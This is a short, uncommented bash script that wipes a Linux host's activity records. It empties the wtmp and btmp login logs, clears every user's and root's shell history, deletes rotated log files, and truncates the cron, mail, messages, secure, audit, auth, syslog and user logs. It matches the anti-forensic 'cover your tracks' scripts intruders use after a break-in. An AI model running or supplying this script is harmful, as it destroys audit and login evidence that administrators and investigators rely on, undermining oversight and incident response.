#!/bin/bash 
echo > /var/log/wtmp 
echo > /var/log/btmp 
for i in `ls /home/`; 
do 
 HISDIR=/home/${i}/.bash_history 
 echo '' > ${HISDIR} 
done 
echo '' > /root/.bash_history 
rm -rf /var/log/btmp-* 
rm -rf /var/log/wtmp-* 
rm -rf /var/log/cron-* 
echo '' > /var/log/cron 
rm -rf /var/log/cron.log.* 
echo '' > /var/log/cron.log 
rm -rf /var/log/maillog-* 
echo '' > /var/log/maillog 
rm -rf /var/log/messages-* 
rm -rf /var/log/messages.* 
echo '' > /var/log/messages 
rm -rf /var/log/secure-* 
echo '' > /var/log/secure 
rm -rf /var/log/audit/audit.log.* 
echo '' > /var/log/audit/audit.log 
echo '' > /var/log/anaconda/syslog 
rm -rf /var/log/auth.log.* 
echo '' > /var/log/auth.log 
rm -fr /var/log/syslog.* 
echo '' > /var/log/syslog 
rm -rf /var/log/user.log.* 
echo '' > /var/log/user.log 
rm -rf /var/log/uucp*
